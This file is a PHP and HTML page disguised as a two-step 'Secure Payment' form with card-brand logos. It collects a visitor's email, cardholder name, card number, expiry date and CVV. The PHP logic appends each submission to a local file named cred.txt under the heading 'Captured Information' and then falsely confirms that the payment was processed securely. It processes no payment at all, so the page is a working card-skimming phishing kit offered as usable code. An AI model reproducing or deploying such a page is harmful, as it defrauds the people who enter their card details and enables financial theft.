<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>User Details & Payment</title>
  <!-- Include Font Awesome for Icons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f3f4f6;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: #ffffff;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }

    .container h1 {
      font-size: 24px;
      color: #333;
      margin-bottom: 20px;
    }

    .card-logos {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }

    .card-logos img {
      width: 50px;
      height: auto;
      margin: 0 10px;
    }

    .container label {
      display: block;
      font-size: 14px;
      text-align: left;
      margin-bottom: 8px;
      color: #555;
    }

    .input-wrapper {
      position: relative;
      margin-bottom: 20px;
    }

    .input-wrapper input {
      width: 100%;
      padding: 12px 40px; /* Adjust for icons */
      border: 1px solid #ddd;
      border-radius: 4px;
      font-size: 14px;
      box-sizing: border-box;
    }

    .input-wrapper input:focus {
      border-color: #6c63ff;
      outline: none;
      box-shadow: 0 0 5px rgba(108, 99, 255, 0.5);
    }

    .input-wrapper .icon {
      position: absolute;
      top: 50%;
      left: 12px;
      transform: translateY(-50%);
      color: #888;
      font-size: 16px;
    }

    .container input[type="submit"] {
      width: 100%;
      padding: 12px;
      background-color: #6c63ff;
      color: #ffffff;
      font-weight: bold;
      cursor: pointer;
      border: none;
      border-radius: 4px;
      transition: background-color 0.3s ease;
    }

    .container input[type="submit"]:hover {
      background-color: #574bff;
    }

    .footer-note {
      font-size: 12px;
      color: #888;
      margin-top: -10px;
    }
  </style>
</head>
<body>
  <?php
    $step = 1;
    $email = $card_name = $card_number = $exp_date = $cvv = "";

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['step']) && $_POST['step'] == 1) {
            $email = htmlspecialchars($_POST['email']);
            $step = 2;
        } elseif (isset($_POST['step']) && $_POST['step'] == 2) {
            $email = htmlspecialchars($_POST['email']);
            $card_name = htmlspecialchars($_POST['card_name']);
            $card_number = htmlspecialchars($_POST['card_number']);
            $exp_date = htmlspecialchars($_POST['exp_date']);
            $cvv = htmlspecialchars($_POST['cvv']);

            $date_time = date("Y-m-d H:i:s");
            $captured_info = "==================== Captured Information ====================\n";
            $captured_info .= "Date & Time: " . $date_time . "\n";
            $captured_info .= "Email: " . $email . "\n";
            $captured_info .= "Cardholder's Name: " . $card_name . "\n";
            $captured_info .= "Card Number: " . $card_number . "\n";
            $captured_info .= "Expiration Date: " . $exp_date . "\n";
            $captured_info .= "CVV: " . $cvv . "\n";
            $captured_info .= "==============================================================\n\n";

            file_put_contents("cred.txt", $captured_info, FILE_APPEND);

            echo "<p>Thank you! Your payment has been processed securely.</p>";
            exit;
        }
    }
  ?>

  <?php if ($step == 1): ?>
    <div class="container">
      <h1>Welcome</h1>
      <p>Please provide your email to proceed to payment.</p>
      <form method="post">
        <input type="hidden" name="step" value="1">
        <label for="email">Email Address:</label>
        <div class="input-wrapper">
          <i class="fas fa-envelope icon"></i>
          <input type="email" id="email" name="email" placeholder="Enter your email" required>
        </div>
        <input type="submit" value="Next">
      </form>
      <p class="footer-note">Your information will remain secure and confidential.</p>
    </div>
  <?php elseif ($step == 2): ?>
    <div class="container">
      <h1>Secure Payment</h1>

      <!-- Display supported card logos -->
      <div class="card-logos">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
        <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg" alt="American Express">
      </div>

      <form method="post">
        <input type="hidden" name="step" value="2">
        <input type="hidden" name="email" value="<?php echo htmlspecialchars($email); ?>">

        <label for="card_name">Cardholder's Name:</label>
        <div class="input-wrapper">
          <i class="fas fa-user icon"></i>
          <input type="text" id="card_name" name="card_name" required>
        </div>

        <label for="card_number">Card Number:</label>
        <div class="input-wrapper">
          <i class="fas fa-credit-card icon"></i>
          <input type="text" id="card_number" name="card_number" required>
        </div>

        <label for="exp_date">Expiration Date (MM/YY):</label>
        <div class="input-wrapper">
          <i class="fas fa-calendar-alt icon"></i>
          <input type="text" id="exp_date" name="exp_date" required>
        </div>

        <label for="cvv">CVV:</label>
        <div class="input-wrapper">
          <i class="fas fa-lock icon"></i>
          <input type="text" id="cvv" name="cvv" required>
        </div>

        <input type="submit" value="Pay Now">
      </form>
      <p class="footer-note">Your payment is secure and encrypted.</p>
    </div>
  <?php endif; ?>
</body>
</html>
